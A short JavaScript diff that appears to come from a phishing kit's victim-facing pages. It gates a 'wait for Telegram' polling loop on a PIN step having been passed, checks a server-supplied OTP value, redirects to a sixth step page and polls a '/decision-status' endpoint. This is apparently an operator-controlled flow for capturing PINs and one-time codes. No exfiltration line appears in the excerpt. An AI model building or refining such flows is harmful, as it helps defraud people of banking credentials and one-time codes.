@@ -39,7 +39,7 @@ if (localStorage.getItem("firstProcess") === "yes") {
 }
 
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
-if (true){
+if (localStorage.getItem("fromPin") === "yes") {
 
     setInterval(async () => {
     
@@ -56,9 +56,8 @@ if (true){
             }
 
             if (data.otp === 6) {
-                localStorage.removeItem("fromPin");
-                window.location.href = "step6.html";
-            }
+    window.location.href = "step6.html";
+}
 
             const decisionRes = await fetch("/decision-status");
             const decisionData = await decisionRes.json();
